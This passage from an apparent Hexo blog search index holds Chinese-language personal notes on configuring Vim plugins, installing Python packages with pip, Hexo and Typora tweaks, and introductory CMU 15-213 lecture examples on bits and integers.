    <content type="text"><![CDATA[好久没有写c了，发现用Vim写c有点问题，所以就装了一些插件。 主要是通过Vundle来管理插件。 VundleGitHub地址：https://github.com/VundleVim/Vundle.vim安装Vundle和安装插件都很简单，把卸载插件的方法记录一下。12345678910111213143.7 CLEANING UP ~ *vundle-plugins-cleanup* *:PluginClean*&gt; :PluginCleanRequests confirmation for the removal of all plugins no longered configuredin your `.vimrc` but present in your bundle installation directory(default: `.vim/bundle/`). *:PluginClean!*&gt; :PluginClean!Automatically confirm removal of unused bundles. Vim colorschemesGitHub地址：https://github.com/flazz/vim-colorschemes这个安装以后就有很多颜色主题了。 vim.cppThis file contains additional syntax highlighting that I use for C++11/14/17 development in Vim. Compared to the standard syntax highlighting for C++ it adds highlighting of (user defined) functions and the containers and types in the standard library / boost. Development is done at: http://github.com/octol/vim-cpp-enhanced-highlight主要是C++的语法高亮 YouCompleteMe这个是很难安装的插件，不过之前折腾过一次安装成功了。但是没有安装C家族的支持。https://github.com/Valloric/YouCompleteMe官网上说的很清楚，但是上次还是踩了一些坑。 python环境变量好像只能配置一个，多的删掉。 Vim要64位的，官方好像没有。找的非官方编译版。 还有些坑可能忘了今天的安装比较顺利，它下载Clang用了一些时间，但是最后安装成功。但是用了以后发现报错ValueError: Still no compile flags, no completions yet解决办法：https://github.com/Valloric/YouCompleteMe/issues/7001let g:ycm_global_ycm_extra_conf = &apos;/前面的路径/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp/ycm/.ycm_extra_conf.py&apos; Asyncrun这个是蛮厉害一个插件，默认Quickfix窗口是不显示的。可能是我不会用，目前感觉不好使。所以一键运行还是照别人的。大概是这样：1234567891011121314151617181920&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; Quickly Run&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;map &lt;F5&gt; :call CompileRunGcc()&lt;CR&gt;func! CompileRunGcc() exec &quot;w&quot; if &amp;filetype == &apos;c&apos; exec &apos;!g++ % -o %&lt;&apos; exec &apos;!time ./%&lt;&apos; elseif &amp;filetype == &apos;cpp&apos; exec &apos;!g++ % -o %&lt;&apos; exec &apos;!time ./%&lt;&apos; elseif &amp;filetype == &apos;python&apos; exec &apos;!time python %&apos; elseif &amp;filetype == &apos;sh&apos; :!time bash % endif endfunc 但应该是系统的缘故，所以有所不同。win下应该是这样。12345678if &amp;filetype == &apos;c&apos; exec &quot;!gcc % -o %&lt;&quot; exec &quot;!%&lt;&quot;elseif &amp;filetype == &apos;cpp&apos; exec &quot;!gcc % -o %&lt;&quot; exec &quot;!%&lt;&quot;elseif &amp;filetype == &apos;python&apos; exec &quot;!python %&quot; 暂时只用得到这三个。感叹号是呼出系统命令， %号是文件名， %&lt;是去后缀的文件名。折腾半天得出来的结果。]]></content>
  </entry>
  <entry>
    <title><![CDATA[15-213 Bits, Bytes, &Integers1]]></title>
    <url>%2F2017%2F11%2F26%2F15-213-Bits-Bytes-Integers1%2F</url>
    <content type="text"><![CDATA[Bits, Bytes and Integers - Part 1Everything is bitsEach bit is 0 or 1By encoding/interpreting sets of bits in various ways Computers determine what to do (instructions) … and represent and manipulate numbers, sets, strings, etc…Why bits? Electronic Implementation Easy to store with bistable elements Reliably transmitted on noisy and inaccurate wiresEncoding Byte Values0 0 00001 1 00012 2 00103 3 00114 4 01005 5 01016 6 01107 7 01118 8 10009 9 1001A 10 1010B 11 1011C 12 1100D 13 1101E 14 1110F 15 1111 Boolean AlgebraAnd A&amp;B = 1 when both A=1 and B=1Or A|B = 1 when either A=1 or B=1Not~A = 1 when A=0Exclusive-Or (Xor)A^B = 1 when either A=1 or B=1, but not both Example: Representing &amp; Manipulating SetsRepresentation Width w bit vector represents subsets of {0, …, w–1} a j = 1 if j ∈ A 01101001 { 0, 3, 5, 6 } 76543210 01010101 { 0, 2, 4, 6 } 76543210Operations &amp; Intersection 01000001 { 0, 6 } | Union 01111101 { 0, 2, 3, 4, 5, 6 } ^ Symmetric difference 00111100 { 2, 3, 4, 5 } ~ Complement 10101010 { 1, 3, 5, 7 } Shift Operations Left Shift: x &lt;&lt; y Shift bit-vector x left y positions– Throw away extra bits on leftFill with 0 ’s on rightShift bit-vector x left y positions Right Shift: x &gt;&gt; y Shift bit-vector x right y positions Logical shift Fill with 0 ’s on left Arithmetic shift Replicate most significant bit on left]]></content>
  </entry>
  <entry>
    <title><![CDATA[hexo文章中加入图片]]></title>
    <url>%2F2017%2F11%2F25%2Fhexo%E6%96%87%E7%AB%A0%E4%B8%AD%E5%8A%A0%E5%85%A5%E5%9B%BE%E7%89%87%2F</url>
    <content type="text"><![CDATA[前面发出来那篇第三方包安装发现图片都没有加载出来，目前已经解决了这个问题。解决方案如下： 修改_config.yml文件中 post_asset_folder项为true 安装插件npm install hexo-asset-image --save 将图片放入文件夹中，可以用![]()方法引入图片]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python 求导 和 安装第三方包中出现的小问题]]></title>
    <url>%2F2017%2F11%2F25%2F20171125%2F</url>
    <content type="text"><![CDATA[sympy之前函数求导一直用MATLAB，现在发现几乎所有Matlab的功能都能够用python代替。今天发现了sympy这个库。简单的使用方法如下123from sympy import *x=Symbol("x")diff(1/(1+x**2),x) 有时间再去仔细看看这个。 WordCloud 安装今天刚好有人在WordCloud安装时碰到了问题，自己一试，刚开始也没装上。错误提示1UnicodeDecodeError: &apos;utf-8&apos; codec can&apos;t decode byte 0xa1 in position 55: invalid start byte 看上去是字符编码问题，但是目前没搞懂产生问题的原因。另外一个人碰到的问题是提示1error: Microsoft Visual C++ 14.0 is required. 这个因为我安装了VS2017，所以没有这个提示。我看了下WordCloud的官网，发现有这样的提示1worcloud depends on numpy&gt;=1.5.1, pillow and matplotlib. To install it via pip, you will also need a C compiler. 那么理论上来讲装了VS2017应该就没事了。但是这种解决方法毕竟太麻烦。123If you&apos;re having trouble with pip installation on windows, you can find a .whl file at:http://www.lfd.uci.edu/~gohlke/pythonlibs/#wordcloud 官网上也给了相应的解决办法。直接去下编译好的Whl包进行安装。最后成功解决问题。 后来在网上查了一下，在windows下使用pip安装一些python的第三方库，有很多都使用了C写一些扩展，需要使用相应的编译环境进行编译安装。所以直接下载编译好的wheel安装包就非常方便，UCI(加州大学尔湾分校)就提供了大量已经编译打包好的针对windows的wheel安装包，刚好发现上面的下载地址就来源于这。1https://www.lfd.uci.edu/~gohlke/pythonlibs/ 这个页面相当熟悉，原来来过很多次今天才知道这里存在的意义。关键是有很多科学计算的包可以直接从这里下载。果断收藏。前面编码的问题也由此得到解决，但是还是找不到问题产生的原因。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python 安装第三方包]]></title>
    <url>%2F2017%2F11%2F23%2FPython%20%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%2F</url>
    <content type="text"><![CDATA[Python 安装第三方包环境变量和pip简介环境变量（environment variables）一般是指在操作系统中用来指定操作系统运行环境的一些参数，如临时文件夹位置和系统文件夹位置等。 PATH 罗列出 shell 搜索 用户 输入的执行命令所在的目录。 HOME (类Unix系统) 和 userprofile (Microsoft Windows) 表示用户的主目录在文件系统中的位置。等等… Windows和DOS操作系统中的path环境变量，当要求系统运行一个程序而没有告诉它程序所在的完整路径时，系统除了在当前目录下面寻找此程序外，还应到path中指定的路径去找。之后的环境变量配置跟PATH有关。 pip pip是一个用来安装和管理Python包的工具。 官方文档：https://pip.pypa.io/en/latest/ 开始假设大家都安装了Python。那么就可以测试一下是否配置好了系统环境变量和pip。 按win+r键 输入cmd后回车 会出现CMD窗口 可以输入 python 后回车，如果出现上图的提示代表环境变量是配置好的。 那么通过输入quit()来退出python环境，再输入pip后回车。如果出现上图的提示代表pip是已经安装好的了。 那么就可以开始通过pip来安装第三方包。可以跳过环境变量配置和pip安装过程。 如果没有上述提示，代表没有配置好。 环境变量配置和pip安装简单来说有两种配置方式。 Python安装包法（简单粗暴）可以从官网下载python的安装包，下载地址 https://www.python.org/ftp/python/3.6.3/python-3.6.3-amd64.exe 64位 下载速度太慢或者需要32位的可以找我直接微信传过去。 之前安装过Python如果之前安装过的话，会出现下图的情况 那么选择Modify选项 可以看到第二个选项就是pip安装，勾上。Next. 可以看到第4个选项 Add Python to environment variables 就是将python加入到环境变量中。勾上安装即可。 之前没有安装过Python这种情况和上面大同小异。 注意PATH 和 pip 选项的勾选即可。 手动配置法配置环境变量如果已经安装过python，可以通过手动配置解决问题。 以Win10为例： 右键此电脑 -&gt; 菜单 -&gt; 属性 (或 控制面板-&gt;系统和安全-&gt;系统)(也可以直接搜索) 点击高级系统设置 高级选项卡下 点击环境变量 点击环境变量中的PATH变量编辑（用户或者系统都可以） 将python.exe文件所在的文件目录添加到PATH中去 安装pip理论上讲一般安装完python时都安装了pip，如果很不幸没有安装pip.也可以手动安装 下载地址：https://pypi.python.org/pypi/pip#downloads 下载解压后，CMD进入解压目录，输入python setup.py install进行安装 安装完成后还需要添加环境变量C:\Program Files\Python36\Scripts\(位置可能有不同，重点是scripts文件夹的环境变量配置) 通过pip安装第三方包安装jieba类似开始，打开CMD窗口后，直接输入 pip install jieba 或者 pip3 install jieba 就能够安装jieba 安装好后，通过CMD进入Python输入import jieba 如果没有错误提示就安装成功了。 jieba项目的Github地址 https://github.com/fxsjy/jieba 有基本介绍和使用方法 安装词云类似与安装jieba 命令：pip install wordcloud 官网：https://amueller.github.io/word_cloud/ Github:https://github.com/amueller/word_cloud]]></content>
  </entry>
  <entry>
    <title><![CDATA[VIM TC Typora 小折腾]]></title>
    <url>%2F2017%2F11%2F22%2F20171122%2F</url>
    <content type="text"><![CDATA[VIM airline插件 及 google/yapfVim airline插件碰到的问题是三角显示不出来，最后还是去1https://github.com/powerline/fonts 找到powerline fonts字体安装并修改字体才能够显示成功。不过为了显示成功我还是在_vimrc 文件中加入了下面的语句。折腾半天总算成功了。1234let g:airline_left_sep = &apos;⮀&apos;let g:airline_left_alt_sep = &apos;⮁&apos;let g:airline_right_sep = &apos;⮂&apos;let g:airline_right_alt_sep = &apos;⮃&apos; 理论上显示的应该是两个向左的箭头和两个向右的箭头，如果没有就是字体没有搞成功。 另外一个发现的就是google/yapf 1https://github.com/google/yapf 安装之后在_vimrc文件加入以下代码 1autocmd FileType python nnoremap &lt;LocalLeader&gt;= :0,$!yapf&lt;CR&gt; 这样通过默认的 \键和=键就可以完成Python代码的自动格式化 Total Commander 初步折腾前几天开始用TC，刚开始还不知道好在哪。今天发现很多非常节约时间的功能。 CTRL + B 可以把文件夹全部展开看到所有文件 CTRL + D 快速跳转文件夹 ALT + DOWN 查看历史文件夹列表 很好用 不用像以前开很多窗口还找不到。不用快捷键也可以通过小三角打开。 搜索可以加入everything支持 按SHIFT在点选大小日期等排序可以多重条件排序 工具栏可以自定义 我加上了命令行 可以改一下文件大小的显示设置，GB甚至TB都支持 可以将最近修改的文件自动用颜色标出 Typora 更改字体我现在的Markdown都在Typora上写，以前主要是代码。没太注重中文的问题，现在打很多中文，用默认的宋体效果不是很好。 在 Typora 中依次打开 Preferences → Theme → Open Theme Folder 修改对应主题文件 将font-family，在 body{ } 里的 font-family 后添加 ,&#39;Microsoft YaHei&#39; 要修改多个 修改好后用着win10 17025后的字体基本上完美]]></content>
  </entry>
  <entry>
    <title><![CDATA[开始学习CMU15-213]]></title>
    <url>%2F2017%2F11%2F21%2F1%2F</url>
    <content type="text"><![CDATA[之前多次碰到需要汇编知识的情况，所以一直想开始啃CSAPP。不过书太厚，好像直接看书效果也不是很好，所以找来CMU15-213的视频开始学习。相关资料地址1http://www.cs.cmu.edu/~213/schedule.html 可以看到最新的教学视频和课件。 第一课 Overview课程开始举了几个好玩的例子。 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int sq(int x) &#123; return x*x;&#125;int main(int argc, char *argv[]) &#123; int i; for (i = 1; i &lt; argc; i++) &#123; int x = atoi(argv[i]); int sx = sq(x); printf("sq(%d) = %d\n", x, sx); &#125; return 0;&#125;40000 * 40000 --&gt; 160000000050000 * 50000 --&gt; ? 123Float’s:(1e20 + -1e20) + 3.14 --&gt; 3.141e20 + (-1e20 + 3.14) --&gt; ?? 123456789101112131415161718typedef struct &#123;int a[2];double d;&#125; struct_t;double fun(int i) &#123;volatile struct_t s;s.d = 3.14;s.a[i] = 1073741824; /* Possibly out of bounds */return s.d;&#125;fun(0) --&gt; 3.14fun(1) --&gt; 3.14fun(2) --&gt; 3.1399998664856fun(3) --&gt; 2.00000061035156fun(4) --&gt; 3.14fun(6) --&gt; Segmentation fault C and C++ do not provide any memory protection12345678void copyij(int src[2048][2048],int dst[2048][2048])&#123;int i,j;for (i = 0; i &lt; 2048; i++)for (j = 0; j &lt; 2048; j++)dst[i][j] = src[i][j];&#125; 4.3ms 12345678void copyji(int src[2048][2048],int dst[2048][2048])&#123;int i,j;for (j = 0; j &lt; 2048; j++)for (i = 0; i &lt; 2048; i++)dst[i][j] = src[i][j];&#125; 运行时间81.8ms Performance depends on access patterns之后半节课就一直在讲 Academic Integrity 的问题 最后就是简单介绍一下课程内容]]></content>
  </entry>
  <entry>
    <title><![CDATA[解决GVIM菜单乱码]]></title>
    <url>%2F2017%2F11%2F20%2F%E8%A7%A3%E5%86%B3GVIM%E8%8F%9C%E5%8D%95%E4%B9%B1%E7%A0%81%2F</url>
    <content type="text"><![CDATA[因为系统语言经常变化的缘故，突然发现GVIM的菜单出现乱码。主要解决方案参考1https://github.com/gatieme/AderXCoding/tree/master/system/tools/vim/gvim_chinese 还可以解决文件显示乱码、菜单乱码、consle乱码。马一下。因为只出现了菜单乱码所以只用在_vimrc 文件中加入以下代码即可12source $VIMRUNTIME/delmenu.vimsource $VIMRUNTIME/menu.vim]]></content>
  </entry>
  <entry>
    <title><![CDATA[Start]]></title>
    <url>%2F2017%2F11%2F19%2FStart%2F</url>
    <content type="text"><![CDATA[终于忙里偷闲把这里给搭好了。连续忙了两周，下周还要继续忙。原本是上周把搭建的基本工作完成的，基本是参考12https://github.com/limedroid/HexoLearninghttps://hexo.io/zh-cn/docs/index.html 这里来完成的。途中好像确实踩了几个坑，但是现在都忘了。 因为记忆力的减退，以后就把这里当作折腾的备忘录了。 略微提一下部署Hexo遇到的坑： 环境变量（主要是安装和部署命令没跑起来） GitHub 匿名邮箱的坑，具体细节忘了 网络环境差，整个过程中间可能会因为网络莫名中断或者龟速。 进行配置时，需要在冒号： 后加一个英文空格 一开始看readme可以少走很多弯路 目前还很简陋，需要修修补补。]]></content>
  </entry>
</search>
